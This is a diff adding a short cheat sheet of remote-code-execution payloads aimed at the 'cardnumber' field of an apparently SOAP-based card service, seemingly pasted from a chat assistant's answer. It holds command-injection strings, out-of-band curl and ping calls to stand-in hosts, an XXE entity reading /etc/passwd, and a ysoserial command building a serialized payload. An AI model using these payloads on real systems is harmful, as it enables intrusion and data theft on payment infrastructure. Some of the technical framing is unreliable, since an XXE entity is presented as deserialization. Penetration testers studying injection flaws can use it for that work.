@@ -1,0 +1,75 @@
+🧪 Common RCE Test Strategies
+✅ 1. Command Injection (Linux / Windows)
+Send payloads in the cardnumber field like:
+
+xml
+Copy
+Edit
+<cardnumber xsi:type="xsd:string">511031; whoami</cardnumber>
+Or for Windows:
+
+xml
+Copy
+Edit
+<cardnumber xsi:type="xsd:string">511031 & whoami</cardnumber>
+Test variations:
+
+511031 | whoami
+
+511031 && id
+
+511031 || uname -a
+
+511031$(whoami)
+
+511031`id`
+
+📌 Observe the response or use out-of-band interaction (like a DNS pingback or Burp Collaborator).
+
+✅ 2. Out-of-Band Exploitation (Blind RCE)
+Use external interaction if the app returns no direct result:
+
+xml
+Copy
+Edit
+<cardnumber xsi:type="xsd:string">511031; curl http://yourdomain.com/</cardnumber>
+Or ping an external server:
+
+xml
+Copy
+Edit
+<cardnumber xsi:type="xsd:string">511031; ping yourhost.dnslog.cn</cardnumber>
+Tools:
+
+Burp Collaborator
+
+dnslog.cn / interact.sh
+
+✅ 3. Deserialization-Based RCE
+If the server uses Java, .NET, or PHP and unserializes objects from XML payloads, try:
+
+xml
+Copy
+Edit
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+Or use malicious serialized objects like Java serialized payloads:
+
+bash
+Copy
+Edit
+java -jar ysoserial.jar CommonsCollections1 'curl yourdomain.com' > payload.xml
+Inject the output into the cardnumber or a hidden parameter.
+
+✅ 4. SOAPAction Manipulation + Header Fuzzing
+Sometimes, the SOAPAction header or other headers are mishandled, and you can smuggle RCE payloads:
+
+
+<cardnumber>511031</cardnumber>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+
+Alter SOAPAction to unexpected or unsafe function
+
+Inject RCE payloads via custom headers (Burp Intruder)
+
